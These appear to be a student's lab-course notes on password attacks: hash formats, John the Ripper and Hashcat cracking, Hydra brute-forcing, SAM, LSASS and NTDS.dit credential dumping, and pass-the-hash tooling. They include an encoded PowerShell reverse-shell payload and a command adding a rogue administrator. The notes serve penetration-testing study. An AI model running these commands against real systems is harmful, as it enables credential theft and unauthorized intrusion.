# Password Attacks
## Credential Storage
### Linux 
**Stored at -**  `/etc/shadow` **and stored in hash formate** 

`/etc/shadow` file formate

user_name: |	$y$j9T$3JHEBD6NDKDu...SNIP...f8Ms:|	18955:	|0:|	99999:|	7:|	:|	:|	:
|-|-|-|-|-|-|-|-|-|
username:	| encrypted password :|	 day of last change :|	 min age :|	 max age :	| warning period :	| inactivity period :	| expiration date :|	 reserved field |

**encryption formate**

$ id	|$ salt|	$ hashed
|-|-|-|
$ y	|$ j9T|	$ 3QSBB6CbHEu...SNIP...f8Ms

**ID identification**
ID	|Cryptographic Hash Algorithm
|-|-|
`$1$`|	MD5
`$2a$`	|Blowfish
`$5$`|	SHA-256
`$6$`	|SHA-512
`$sha1$`|	SHA1crypt
`$y$`|	Yescrypt
`$gy$`	|Gost-yescrypt
`$7$`|	Scrypt

`/etc/passwd`

htb-student:|	x:|	1000:|	1000:|	,,,:|	/home/htb-student:|	/bin/bash|
| -|-|-|-|-|-|-|
`<username>:`|	`<password>:`|	`<uid>:`|	`<gid>:`|	`<comment>:`|	`<home directory>:`|	`<cmd executed after logging in>`

### window  (view again for window auth system) 
![window](image.png)

Credentials are encrypted and stored at the following location: `PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\`

## john the ripper
pentesting tool used to check the strength of passwords and crack encrypted (or hashed) passwords using either brute force or dictionary attacks.

### Encryption Technologies
Encryption Technologies |	Description
|-|-|
UNIX crypt(3)	|Crypt(3) is a traditional UNIX encryption system with a 56-bit key.
Traditional DES-based	|DES-based encryption uses the Data Encryption Standard algorithm to encrypt data.
bigcrypt	|Bigcrypt is an extension of traditional DES-based encryption. It uses a 128-bit key.
BSDI extended DES-based	|BSDI extended DES-based encryption is an extension of the traditional DES-based encryption and uses a 168-bit key.
FreeBSD MD5-based (Linux & Cisco)	|FreeBSD MD5-based encryption uses the MD5 algorithm to encrypt data with a 128-bit key.
OpenBSD Blowfish-based	|OpenBSD Blowfish-based encryption uses the Blowfish algorithm to encrypt data with a 448-bit key.
Kerberos/AFS	|Kerberos and AFS are authentication systems that use encryption to ensure secure entity communication.
Windows LM	|Windows LM encryption uses the Data Encryption Standard algorithm to encrypt data with a 56-bit key.
DES-based tripcodes	|DES-based tripcodes are used to authenticate users based on the Data Encryption Standard algorithm.
SHA-crypt hashes	|SHA-crypt hashes are used to encrypt data with a 256-bit key and are available in newer versions of Fedora and Ubuntu.
SHA-crypt and SUNMD5 hashes (Solaris)|	SHA-crypt and SUNMD5 hashes use the SHA-crypt and MD5 algorithms to encrypt data with a 256-bit key and are available in Solaris.

### Attack Method 

1. Dictionary Attacks
2. Brute Force Attacks
3. Rainbow Table Attacks

### Cracking Modes

    john --format=<hash_type> <hash or hash_file>

- `john` -  is the command to run the John the Ripper program
- `--format=<hash_type>`  - specifies that the hash format.
- `<hash or hash_file>`  - is the file name 

Hash Format	| Example Command	| Description
|-|-|-|
afs	|john --format=afs hashes_to_crack.txt|	AFS (Andrew File System) password hashes
bfegg	|john --format=bfegg hashes_to_crack.txt	|bfegg hashes used in Eggdrop IRC bots
bf	|john --format=bf hashes_to_crack.txt	|Blowfish-based crypt(3) hashes
bsdi	john --format=bsdi hashes_to_crack.txt	BSDi crypt(3) hashes
crypt(3)	john --format=crypt hashes_to_crack.txt	Traditional Unix crypt(3) hashes
des	john --format=des hashes_to_crack.txt	Traditional DES-based crypt(3) hashes
dmd5	john --format=dmd5 hashes_to_crack.txt	DMD5 (Dragonfly BSD MD5) password hashes
dominosec	john --format=dominosec hashes_to_crack.txt	IBM Lotus Domino 6/7 password hashes
EPiServer SID hashes	john --format=episerver hashes_to_crack.txt	EPiServer SID (Security Identifier) password hashes
hdaa	john --format=hdaa hashes_to_crack.txt	hdaa password hashes used in Openwall GNU/Linux
hmac-md5	john --format=hmac-md5 hashes_to_crack.txt	hmac-md5 password hashes
hmailserver	john --format=hmailserver hashes_to_crack.txt	hmailserver password hashes
ipb2	john --format=ipb2 hashes_to_crack.txt	Invision Power Board 2 password hashes
krb4	john --format=krb4 hashes_to_crack.txt	Kerberos 4 password hashes
krb5	john --format=krb5 hashes_to_crack.txt	Kerberos 5 password hashes
LM	john --format=LM hashes_to_crack.txt	LM (Lan Manager) password hashes
lotus5	john --format=lotus5 hashes_to_crack.txt	Lotus Notes/Domino 5 password hashes
mscash	john --format=mscash hashes_to_crack.txt	MS Cache password hashes
mscash2	john --format=mscash2 hashes_to_crack.txt	MS Cache v2 password hashes
mschapv2	john --format=mschapv2 hashes_to_crack.txt	MS CHAP v2 password hashes
mskrb5	john --format=mskrb5 hashes_to_crack.txt	MS Kerberos 5 password hashes
mssql05	john --format=mssql05 hashes_to_crack.txt	MS SQL 2005 password hashes
mssql	john --format=mssql hashes_to_crack.txt	MS SQL password hashes
mysql-fast	john --format=mysql-fast hashes_to_crack.txt	MySQL fast password hashes
mysql	john --format=mysql hashes_to_crack.txt	MySQL password hashes
mysql-sha1	john --format=mysql-sha1 hashes_to_crack.txt	MySQL SHA1 password hashes
NETLM	john --format=netlm hashes_to_crack.txt	NETLM (NT LAN Manager) password hashes
NETLMv2	john --format=netlmv2 hashes_to_crack.txt	NETLMv2 (NT LAN Manager version 2) password hashes
NETNTLM	john --format=netntlm hashes_to_crack.txt	NETNTLM (NT LAN Manager) password hashes
NETNTLMv2	john --format=netntlmv2 hashes_to_crack.txt	NETNTLMv2 (NT LAN Manager version 2) password hashes
NEThalfLM	john --format=nethalflm hashes_to_crack.txt	NEThalfLM (NT LAN Manager) password hashes
md5ns	john --format=md5ns hashes_to_crack.txt	md5ns (MD5 namespace) password hashes
nsldap	john --format=nsldap hashes_to_crack.txt	nsldap (OpenLDAP SHA) password hashes
ssha	john --format=ssha hashes_to_crack.txt	ssha (Salted SHA) password hashes
NT	john --format=nt hashes_to_crack.txt	NT (Windows NT) password hashes
openssha	john --format=openssha hashes_to_crack.txt	OPENSSH private key password hashes
oracle11	john --format=oracle11 hashes_to_crack.txt	Oracle 11 password hashes
oracle	john --format=oracle hashes_to_crack.txt	Oracle password hashes
pdf	john --format=pdf hashes_to_crack.txt	PDF (Portable Document Format) password hashes
phpass-md5	john --format=phpass-md5 hashes_to_crack.txt	PHPass-MD5 (Portable PHP password hashing framework) password hashes
phps	john --format=phps hashes_to_crack.txt	PHPS password hashes
pix-md5	john --format=pix-md5 hashes_to_crack.txt	Cisco PIX MD5 password hashes
po	john --format=po hashes_to_crack.txt	Po (Sybase SQL Anywhere) password hashes
rar	john --format=rar hashes_to_crack.txt	RAR (WinRAR) password hashes
raw-md4	john --format=raw-md4 hashes_to_crack.txt	Raw MD4 password hashes
raw-md5	john --format=raw-md5 hashes_to_crack.txt	Raw MD5 password hashes
raw-md5-unicode	john --format=raw-md5-unicode hashes_to_crack.txt	Raw MD5 Unicode password hashes
raw-sha1	john --format=raw-sha1 hashes_to_crack.txt	Raw SHA1 password hashes
raw-sha224	john --format=raw-sha224 hashes_to_crack.txt	Raw SHA224 password hashes
raw-sha256	john --format=raw-sha256 hashes_to_crack.txt	Raw SHA256 password hashes
raw-sha384	john --format=raw-sha384 hashes_to_crack.txt	Raw SHA384 password hashes
raw-sha512	john --format=raw-sha512 hashes_to_crack.txt	Raw SHA512 password hashes
salted-sha	john --format=salted-sha hashes_to_crack.txt	Salted SHA password hashes
sapb	john --format=sapb hashes_to_crack.txt	SAP CODVN B (BCODE) password hashes
sapg	john --format=sapg hashes_to_crack.txt	SAP CODVN G (PASSCODE) password hashes
sha1-gen	john --format=sha1-gen hashes_to_crack.txt	Generic SHA1 password hashes
skey	john --format=skey hashes_to_crack.txt	S/Key (One-time password) hashes
ssh	john --format=ssh hashes_to_crack.txt	SSH (Secure Shell) password hashes
sybasease	john --format=sybasease hashes_to_crack.txt	Sybase ASE password hashes
xsha	john --format=xsha hashes_to_crack.txt	xsha (Extended SHA) password hashes
zip	john --format=zip hashes_to_crack.txt	ZIP (WinZip) password hashes


### wordlist mode

    john --wordlist=<wordlist_file> --rules <hash_file>

### incremental mode

    john --incremental <hash_file>

### Cracking Files with John

    <tool> <file_to_crack> > file.hash
    pdf2john server_doc.pdf > server_doc.hash
    john server_doc.hash 
    john --wordlist=<wordlist.txt> server_doc.hash 

Tool	|Description
|-|-|
|`pdf2john	`|Converts PDF documents for John|
|`ssh2john	`|Converts SSH private keys for John|
|`mscash2john	`|Converts MS Cash hashes for John|
|`keychain2john	`|Converts OS X keychain files for John|
|`rar2john	`|Converts RAR archives for John|
|`pfx2john	`|Converts PKCS#12 files for John|
|`truecrypt_volume2john	`|Converts TrueCrypt volumes for John|
|`keepass2john	`|Converts KeePass databases for John|
|`vncpcap2john	`|Converts VNC PCAP files for John|
|`putty2john	`|Converts PuTTY private keys for John|
|`zip2john	`|Converts ZIP archives for John|
|`hccap2john	`|Converts WPA/WPA2 handshake captures for John |
|`office2john	`|Converts MS Office documents for John|
|`wpa2john	`|Converts WPA/WPA2 handshakes for John|

`locate *2john* ` - to tole more tools for john.

## John For Network services.
### WinRM
- Windows Remote Management (WinRM)
- Web Services Management Protocol (WS-Management)
-  Simple Object Access Protocol (SOAP)
-  Web-Based Enterprise Management (WBEM)
-  Windows Management Instrumentation (WMI)
- Distributed Component Object Model (DCOM).
- Powershell Remoting Protocol (MS-PSRP)
- Common Internet File System (CIFS)

ports `5985 (HTTP)` and `5986 (HTTPS)`

**A handy tool that we can use for our password attacks is `CrackMapExec`**

install CrackMapExec

    sudo apt-get -y install crackmapexec

`crackmapexec -h` - see the help section.
`crackmapexec smb -h` - see the help section for smb.

usages

    crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>

**Another handy tool that we can use to communicate with the WinRM service is Evil-WinRM**

**Install**

    sudo gem install evil-winrm

**Usages**

    evil-winrm -i <target-IP> -u <username> -p <password>

### SSH  `secure shell`
used port `22`, use encryption `symmetric encryption`, `asymmetric encryption`, and `hashing`.

**using Hydra to bruteforce `SSH`**

    hydra -L user.list -P password.list ssh://10.129.42.197

### RDP  Remote Desktop Protocol
Allow remote access to windows system wiht TCP port `3389`

**using Hydra to bruteforce RDP**

    hydra -L user.list -P password.list rdp://10.129.42.197

**linux tool to communicate to the RDP**

    xfreerdp /v:<target-IP> /u:<username> /p:<password>

### SMB Server Message Block

Responsible for transferring data between a client and a server in local area networks.

**using Hydra to bruteforce SMB**

    hydra -L user.list -P password.list smb://10.129.42.197

**Bruteforce the SMB by Metasploit**

    use auxiliary/scanner/smb/smb_login

**to check the share on SMB use CrackerMapExec**

    smb 10.129.42.197 -u "user" -p "password" --shares

**To communicate use smbclient**

    smbclient -U user \\\\10.129.42.197\\SHARENAME

## Password Mutations
**HASHCAT existing rules**

    ls /usr/share/hashcat/rules/
    hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list # create the custom rule passwprd.

[CeWL](https://github.com/digininja/CeWL) is s tool to scan potential words from the company's website and save them in a separate list.

## Password reuse and default password
1. [default cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) 
2. google it
3. see the manual.

**installation**

    $ git clone https://github.com/ihebski/DefaultCreds-cheat-sheet
    $ pip3 install -r requirements.txt
    $ cp creds /usr/bin/ && chmod +x /usr/bin/creds
    $ creds search tomcat

## Windows
### Attack SAM

With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target.

#### Copying SAM Registry Hives
|Registry Hive	| Description
|-|-|
|hklm\sam| 	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
|hklm\system| 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
|hklm\security| 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

**Note -** We can create backups of these hives using the reg.exe utility.

- **Using reg.exe save to Copy Registry Hives**


        C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

        C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

        C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

- transfer the hive coppy to the attack machine

        Dumping local SAM hashes (uid:rid:lmhash:nthash)
        
- use  Impacket's secretsdump.py to dump the hashes.

#### Remote Dumping & LSA Secrets Considerations

With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

**Dumping LSA Secrets Remotely**

    crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

**Dumping SAM Remotely**

    crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam


### Attacking LSASS
**Dumping LSASS Process Memory**
1. create a copy of the contents of LSASS process memory via the generation of a memory dump (memory dump - in short)
2. move that file to the atack machine for ofline hach cracking.

#### Methoda asd Tools for memory dumps

**1. Task Manager**

`Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file`

*file save at this location - `lsass.DMP`* `C:\Users\loggedonusersdirectory\AppData\Local\Temp`

**2. Rundll32.exe & Comsvcs.dll Method**

Finding LSASS PID in cmd 

    tasklist /svc           #cmd
    Get-Process lsass       #powershell

Creating lsass.dmp using PowerShell

    rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

this saves the file in the dir - `C:\lsass.dmp`

**Using Pypykatz to Extract Credentials [pypykatz](https://github.com/skelsec/pypykatz) :**

    pypykatz lsa minidump /home/peter/Documents/lsass.dmp 


    
### Attacking Active Directory & NTDS.dit

**1. search for the username**
    - google dork
    - social media
    - email
**generate automated username -** use the name to generate the usernames. [username-anarchy](https://github.com/urbanadventurer/username-anarchy)

**2. Launching the Attack with CrackMapExec**

#### long method 
**command to attack AD** 

    crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt

**Capturing NTDS.dit**

**connect to the remote machine** `evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`

**Checking Local Group Membership -** `net localgroup`

**Checking User Account Privileges including Domain -** `net user <usernaem>`, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. 

**Creating Shadow Copy of C: -** `vssadmin CREATE SHADOW /For=C:`

**Copying NTDS.dit from the VSS -** `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` 

**Transferring NTDS.dit to Attack Host** `cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData` here we are using smb shre at out attack host.

#### easy method  (dump the hashes in the atact box terminal)

    crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

**3. crack the hash with hashcat** 

*if we are unsuccessful in cracking a hash? - We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH).*

    evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"

### Credential Hunting in Windows

#### Search Centric
**Search Tools** 
- `window search` - with the knows keywords of GUI access, or use 3rd part tool called [LaZagne](https://github.com/AlessandroZ/LaZagne)
    
    start lazagne.exe all

- Using `findstr`

    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml



## Linux
### Credential Hunting in Linux

Files|	History|	Memory|	Key-Rings|
|-|-|-|-|
Configs	|Logs	|Cache	|Browser stored credentials
Databases|	Command-line| History	In-memory Processing|	
Notes		|	|
Scripts			|
Source codes	|		
Cronjobs		|	
SSH Keys|

### Find
Configuration |files	|Databases	|Notes
|-|-|-|-|
Scripts|Cronjobs|SSH|keys

**search for the conf/config.cnf file**

    for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

**search the user/pass/password inthe file .cnf**

    for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done    

**Database files**

    for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

**Notes**

    find /home/* -type f -name "*.txt" -o ! -name "*.*"

**Scripts**

    for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

### Cronjob

    cat /etc/crontab 
    ls -la /etc/cron.*/

### SSH private key

    #private key
    grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1" 

    #public key
    grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

### Bash History

    tail -n5 /home/*/.bash*

### logs
**Important LOGS**

Log File	|Description
|-|-|
/var/log/messages	|Generic system activity logs.
/var/log/syslog	|Generic system activity logs.
/var/log/auth.log	|(Debian) All authentication related logs.
/var/log/secure	|(RedHat/CentOS) All authentication related logs.
/var/log/boot.log	|Booting information.
/var/log/dmesg	|Hardware and drivers related information and logs.
/var/log/kern.log	|Kernel related warnings, errors and logs.
/var/log/faillog	|Failed login attempts.
/var/log/cron	|Information related to cron jobs.
/var/log/mail.log	|All mail server related logs.
/var/log/httpd	All |Apache related logs.
/var/log/mysqld.log	|All MySQL server related logs.

    for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

### Memory Cache [mimipenguin](https://github.com/huntergregal/mimipenguin) , LaZagne

    sudo python3 mimipenguin.py #required root permission
    sudo python2.7 laZagne.py all

### Browser
    ls -l .mozilla/firefox/ | grep default 
    cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

*tool to decrypt the hash fron the json -*[firefox_decrypt](https://github.com/unode/firefox_decrypt)



### Cracking Linux Credentials

    sudo cp /etc/passwd /tmp/passwd.bak 
    sudo cp /etc/shadow /tmp/shadow.bak 
    unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
    hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
    

## Pass the Hash (PtH)

*A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash.*

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).
    
**1. Pass the Hash with Mimikatz (Windows)**
To use this module, we will need the following:

- /user - The user name we want to impersonate.
- /rc4 or /NTLM - NTLM hash of the user's password.
- /domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- /run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).

    mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

**2. Pass the Hash with PowerShell Invoke-TheHash (Windows)**
When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:

- Target - Hostname or IP address of the target.
- Username - Username to use for authentication.
- Domain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.
- Hash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
- Command - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.

    **invoke with smb**
    PS c:\htb> cd C:\tools\Invoke-TheHash\
    PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
    PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

    **natat listiner**
    Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwANwAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
    #b64 is the payload of reverse shell.

**3. Pass the Hash with Impacket (Linux)**
Impacket has several tools we can use for different operations such as Command Execution and Credential Dumping, Enumeration, etc. For this example, we will perform command execution on the target machine using PsExec.

    impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453

other tools 
- `impacket-wmiexec`
- `impacket-atexec`
- `impacket-smbexec`

**4. Pass the Hash with CrackMapExec (Linux)**

    #into the machine
    crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

    #command execution
    crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami 

**5. Pass the Hash with evil-winrm (Linux)**

    evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

    enable restriction then only you get the rdp login.
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

**6. Pass the Hash with RDP (Linux)**

There are a few caveats to this attack:

Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![alt text](image-1.png)

This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0. It can be done using the following command:

    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

gain access with the xfreerdp.
    
    xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B


## Pass the Ticket (PtT) from Windows


